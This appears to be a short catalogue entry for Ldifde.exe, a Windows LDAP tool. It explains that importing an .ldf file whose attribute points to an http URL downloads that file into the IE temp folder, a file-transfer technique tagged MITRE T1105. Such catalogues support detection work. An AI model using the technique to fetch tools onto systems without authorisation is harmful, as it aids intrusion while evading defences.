title: Ldifde.exe
html:
Ldifde.exe

Creates, modifies, and deletes LDAP directory objects.

Download

Download file from Internet

Ldifde -i -f {PATH:.ldf}

Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder. — MITRE: T1105 — Privileges: Administrator
